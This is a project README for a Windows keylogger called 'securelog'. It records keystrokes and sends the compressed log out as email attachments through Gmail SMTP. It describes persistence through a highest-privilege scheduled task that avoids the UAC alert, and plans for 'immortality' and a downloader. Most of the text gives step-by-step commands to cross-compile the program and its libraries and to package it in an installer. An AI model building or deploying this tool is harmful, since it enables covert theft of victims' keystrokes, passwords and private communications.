# Keylog & Gmail

## About this thing

This is a lazy implementation for a keylogger that sends keylogs through gmail smtp under Windows. :smile:

## Features

* Logs keys and makes notes about special keys and stores them in a file.
* Downloads Mozilla's certificates bundle made by the [curl team](http://curl.haxx.se/ca/cacert.pem) to use it for secure connexion to Gmail SMTP.
* Upon a scheduled task sends keylog file as compressed attachement.
* Autoruns on startup with a scheduled task with highest privileges.
* Handy NSIS Installer (we will make our scheduled tasks from there).

> Setting a scheduled task running with highest privileges will prevent triggering the alert from the UAC

> The log is mailed as attachment that is compressed with zlib (file: `securelog.xxx`); to decompress it you'll need to compile [zpipe](http://zlib.net/zpipe.c) that is included in the zlib's examples folder. Usage of zpipe is quite simple:
> ```bash
> ./zpipe -d < securelog.xxx > securelog.txt
> ```

## TODO

* Implement error checking.. (Yeah, first thing to do when I'll have time! :stuck_out_tongue_winking_eye:)
* Fix many many bugs.. (Characters check, uninstaller while program's running..)
* Implement tweaks & new features.. (Strip the size, immortality, downloader..)
* Add compile instructions for Windows users.. :smile:

## Compiling this thing

### Fetch program's source with curl, zlib and OpenSSL sources as submodules:

```bash
git clone https://github.com/pr-nizar/securelog --recurse-submodules
```

> Or if you don't want to get submodules immediately you can `git clone https://github.com/pr-nizar/securelog` the main repository then `git submodule update --init --recursive` to get the heavy submodules.

### Cross-compiling under Ubuntu

#### Dependencies

```bash
sudo apt-get install mingw32 nsis
```

Oh yeah and compiling our librairies one by one on this order:

> I'm cross compiling zlib, openssl and curl with i586-mingw32msvc-gcc. :wink:

#### zlib (v1.2.8)

```bash
cd zlib
sed -e s/"PREFIX ="/"PREFIX = i586-mingw32msvc-"/ -i win32/Makefile.gcc
make -f win32/Makefile.gcc
make -f win32/Makefile.gcc install INCLUDE_PATH=build/include LIBRARY_PATH=build/lib BINARY_PATH=buil/bin
```

#### OpenSSL (OpenSSL_1_0_1p)

```bash
cd openssl
CROSS_COMPILE="i586-mingw32msvc-" ./Configure mingw --prefix=$(pwd)/build \
--openssldir=$(pwd)/build --with-zlib-lib=$(pwd)/../zlib/build/lib \
--with-zlib-include=$(pwd)/../zlib/build/include no-shared disable-capieng
PATH=$PATH:/usr/i586-mingw32msvc/bin make depend
PATH=$PATH:/usr/i586-mingw32msvc/bin make
PATH=$PATH:/usr/i586-mingw32msvc/bin make install
```

> Too much shit in libssl and libcrypto: too heavy; I'll [strip it maybe later](https://wiki.openssl.org/index.php/Compilation_and_Installation#Configure_Options)..

#### Curl (curl-7_44_0)

```bash
cd curl
./buildconf
./configure --host=i586-mingw32msvc LDFLAGS=-mwindows --prefix=$(pwd)/build \
--with-zlib=$(pwd)/../zlib/build --with-ssl=$(pwd)/../openssl/build \
--enable-static --disable-shared --enable-http --enable-smtp --enable-crypto-auth \
--disable-threaded-resolver --disable-cookies --disable-ares --disable-ipv6 \
--disable-manual --disable-proxy --disable-verbose --without-random --without-libidn \
--without-librtmp --disable-ldap --disable-ldaps --disable-dict --disable-ftp \
--disable-file --disable-rtsp  --disable-telnet --disable-tftp --disable-pop3 \
--disable-imap --disable-smb --disable-gopher --without-ca-bundle --without-ca-path
make
make install
```

> Keeping it simple disabling every single protocol or feature that libcurl have except those for HTTP and SMTP with TLS; cause size matters..

#### The main program

```bash
i586-mingw32msvc-gcc -O3 -Os -s -Wno-system-headers -mwindows -DCURL_STATICLIB \
-I$(pwd)/zlib/build/include -I$(pwd)/openssl/build/include \
-I$(pwd)/curl/build/include -o securelog.exe securelog.c -L$(pwd)/zlib/build/lib \
-L$(pwd)/openssl/build/lib -L$(pwd)/curl/build/lib $(pwd)/curl/build/lib/libcurl.a \
$(pwd)/zlib/build/lib/libz.a $(pwd)/openssl/build/lib/libssl.a \
$(pwd)/openssl/build/lib/libcrypto.a -lgdi32 -lssl -lcrypto -lcurl -lz -lws2_32
```

> I know this is strange but that's the only way I got it to compile! :cry:

#### The windows installer

```bash
makensis securelog.nsi
```

### Compiling under Windows :scream:

I don't have Windows sorry! It shouldn't be that hard anyway.. Why don't you get yourself [a decent Linux distro](http://xubuntu.org/) in the meanwhile?!

> Just kidding! :stuck_out_tongue_winking_eye:
> (TODO :stuck_out_tongue:)

## LICENSE

Still thinking about it... :trollface: